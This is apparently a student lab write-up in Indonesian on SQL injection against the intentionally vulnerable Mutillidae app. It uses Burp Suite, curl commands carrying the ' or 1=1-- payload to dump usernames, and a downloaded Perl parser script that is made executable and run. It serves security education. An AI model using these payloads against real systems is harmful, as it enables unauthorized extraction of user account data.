Note : harus mengganti settingan database pada metasploit, database name diubah menjadi owsp10

 1. Buka Mutillidae pada Browser dengan IP/mutillidae
 2. OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info
 ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/section%208%20user%20info.PNG "Tampilan USer Info")
 3. Settig proxy firefox dengan alamat 127.0.0.1:8080
 4. Setting Burpsuite, dengan menonaktifkan intercept
 5. Di page user info masukkan username:
  ' 1=1-- 
  Lihat URL yang dihasilkan. Url yang dihasilkan seperti berikut : 
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_5/bypass_password_username_test.png "Tampilan User Page Info")
  http://192.168.149.101/mutillidae/index.php?page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details
      Terlihat +or+1%3D1-- 
        Keterangan :
        + : space
        %3D : =
   ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/SQL%20Injection%20Obtain%20Userlist.PNG "LIST Username")
  6. Lihat di history http di burpsuite. History burpsuite menunjukkan encoded sql injection. Untuk proses selanjutnya menggunakan curl.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/history%20burpsuite.PNG "History burpsuite")
  7. SQL injection dengan curl. dengan perintah " curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://192.168.1.111/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}' "
  
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20curl.PNG "HASIL CURL")
  
  8. Membuat output file dengan memasukkan hasil curl pada lesson7.txt dengan perintah "  curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://192.168.1.111/mutillidae/index.php" | grep "Username=" > lesson7.txt  " 
  
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20cat%20lesson7.PNG "HASIL CAT CURL")
  
  9. Selanjutnya adalah SQL injection dengan Perl. Download Script Output parser, dengan perintah wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson7/lesson7.pl.TXT
  10. Rename menjadi extensi perl, dengan perintah mv lesson7.pl.TXT lesson7.pl
  11. ubah permission agar dapat membaca dengan perintah chmod 700 lesson7.pl
  
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/download%20output%20parser.PNG "HASIL DOWNLOAD PERL")
  
  12. Jalankan script perl dengan perintah ./lesson7.pl
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20run%20perl%20script.PNG "HASIL SQL INJECTION DENGAN PERL")
   
